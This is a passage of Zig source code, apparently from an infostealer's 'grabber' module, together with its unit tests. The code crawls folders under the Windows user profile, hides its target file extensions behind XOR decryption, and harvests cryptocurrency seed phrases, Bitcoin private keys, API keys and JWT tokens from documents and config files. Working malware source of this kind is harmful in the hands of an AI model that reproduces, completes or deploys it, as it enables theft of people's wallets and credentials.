    var docx_buf: [E.docx.len]u8 = undefined;
    hash.xorDecrypt(&E.docx, &docx_buf);
    var pdf_buf: [E.pdf_ext.len]u8 = undefined;
    hash.xorDecrypt(&E.pdf_ext, &pdf_buf);
    var cfg_buf: [E.cfg.len]u8 = undefined;
    hash.xorDecrypt(&E.cfg, &cfg_buf);
    var conf_buf: [E.conf.len]u8 = undefined;
    hash.xorDecrypt(&E.conf, &conf_buf);
    var ini_buf: [E.ini.len]u8 = undefined;
    hash.xorDecrypt(&E.ini, &ini_buf);
    const exts = [_][]const u8{ txt_buf[0..], doc_buf[0..], docx_buf[0..], pdf_buf[0..], cfg_buf[0..], conf_buf[0..], ini_buf[0..] };
    for (exts) |ext| {
        if (std.ascii.endsWithIgnoreCase(name, ext)) return true;
    }
    return false;
}

pub fn scanBuffer(buffer: []const u8, allocator: std.mem.Allocator) ![]FoundSecret {
    var results = std.ArrayList(FoundSecret).init(allocator);
    errdefer {
        for (results.items) |item| {
            allocator.free(item.value);
        }
        results.deinit();
    }

    try scanBip39(buffer, allocator, &results, "");
    try scanPrivateKeys(buffer, allocator, &results, "");
    try scanApiKeys(buffer, allocator, &results, "");
    try scanJwt(buffer, allocator, &results, "");

    return try results.toOwnedSlice();
}

pub fn scanFile(file_path: []const u8, allocator: std.mem.Allocator) ![]FoundSecret {
    const mapped = file_io.MappedFile.open(file_path) orelse return try allocator.alloc(FoundSecret, 0);
    defer mapped.close();

    if (mapped.size > MAX_FILE_SIZE) return try allocator.alloc(FoundSecret, 0);

    var results = std.ArrayList(FoundSecret).init(allocator);
    errdefer {
        for (results.items) |item| {
            allocator.free(item.value);
        }
        results.deinit();
    }

    const buffer = mapped.slice();
    try scanBip39(buffer, allocator, &results, file_path);
    try scanPrivateKeys(buffer, allocator, &results, file_path);
    try scanApiKeys(buffer, allocator, &results, file_path);
    try scanJwt(buffer, allocator, &results, file_path);

    return try results.toOwnedSlice();
}

pub fn scanFiles(rules: anytype, allocator: std.mem.Allocator) ![]FoundSecret {
    var results = std.ArrayList(FoundSecret).init(allocator);
    errdefer {
        for (results.items) |item| {
            allocator.free(item.value);
        }
        results.deinit();
    }

    const user_profile = std.process.getEnvVarOwned(allocator, "USERPROFILE") catch return try results.toOwnedSlice();
    defer allocator.free(user_profile);

    for (rules) |rule| {
        const dir_path = std.fs.path.join(allocator, &[_][]const u8{ user_profile, rule.base_dir }) catch continue;
        defer allocator.free(dir_path);

        var dir = std.fs.openDirAbsolute(dir_path, .{ .iterate = true }) catch continue;
        defer dir.close();

        var walker = dir.walk(allocator) catch continue;
        defer walker.deinit();

        while (walker.next() catch break) |entry| {
            if (entry.kind != .file) continue;
            if (!hasGrabberExtension(entry.basename)) continue;
            if (rule.max_depth > 0) {
                var depth: u32 = 0;
                for (entry.path) |p| {
                    if (p == '\\' or p == '/') depth += 1;
                }
                if (depth >= rule.max_depth) continue;
            }

            const full_path = std.fs.path.join(allocator, &[_][]const u8{ dir_path, entry.path }) catch continue;
            defer allocator.free(full_path);

            const secrets = scanFile(full_path, allocator) catch continue;
            for (secrets) |s| {
                try results.append(s);
            }
            allocator.free(secrets);
        }
    }

    return try results.toOwnedSlice();
}

const testing = std.testing;

test "scanBuffer finds BTC WIF" {
    const buf = "some text 5HueCGU8rMjqEX4pz7Y6fQG7LfC3PGVqFfGqRk6mNC7Gv3a9Pq and more";
    const result = try scanBuffer(buf, testing.allocator);
    defer {
        for (result) |r| testing.allocator.free(r.value);
        testing.allocator.free(result);
    }
    try testing.expect(result.len >= 1);
    try testing.expectEqualStrings(SECRET_TYPES.btc_wif, result[0].secret_type);
}

test "scanBuffer finds BIP39 seed" {
    const buf = "my seed phrase: abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about";
    const result = try scanBuffer(buf, testing.allocator);
    defer {
        for (result) |r| testing.allocator.free(r.value);
        testing.allocator.free(result);
    }
    try testing.expect(result.len >= 1);
    try testing.expectEqualStrings(SECRET_TYPES.bip39, result[0].secret_type);
}

test "scanBuffer finds JWT" {
    const buf = "token: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNqP2bp3iJ5bGkX7qKzR5p6Gc9X8fL3sZ1q0r2t4 and more";
    const result = try scanBuffer(buf, testing.allocator);
    defer {
        for (result) |r| testing.allocator.free(r.value);
        testing.allocator.free(result);
    }
    try testing.expect(result.len >= 1);
    try testing.expectEqualStrings(SECRET_TYPES.jwt, result[0].secret_type);
}

test "scanBuffer finds AWS key" {
    const buf = "aws_access=AKIAIOSFODNN7EXAMPLE";
    const result = try scanBuffer(buf, testing.allocator);
    defer {
        for (result) |r| testing.allocator.free(r.value);
        testing.allocator.free(result);
    }
    var found = false;
    for (result) |r| {
        if (std.mem.eql(u8, r.secret_type, SECRET_TYPES.aws_key)) {
            found = true;
            break;
        }
    }
    try testing.expect(found);
}

test "scanBuffer empty input" {
    const result = try scanBuffer("", testing.allocator);
    defer testing.allocator.free(result);
    try testing.expect(result.len == 0);
}

test "scanBuffer finds no false positive in regular text" {
    const buf = "The quick brown fox jumps over the lazy dog. This is just normal text without any secrets.";
    const result = try scanBuffer(buf, testing.allocator);
    defer testing.allocator.free(result);
    try testing.expect(result.len == 0);
}

test "isBip39Word validates correctly" {
    try testing.expect(isBip39Word("abandon"));
    try testing.expect(isBip39Word("zoo"));
    try testing.expect(!isBip39Word("notaword"));
    try testing.expect(!isBip39Word(""));
    try testing.expect(!isBip39Word("Abandon"));
}

test "hasGrabberExtension matches extensions" {
    try testing.expect(hasGrabberExtension("seed.txt"));
    try testing.expect(hasGrabberExtension("backup.doc"));
    try testing.expect(hasGrabberExtension("config.ini"));
    try testing.expect(!hasGrabberExtension("photo.jpg"));
    try testing.expect(!hasGrabberExtension("script.exe"));
}
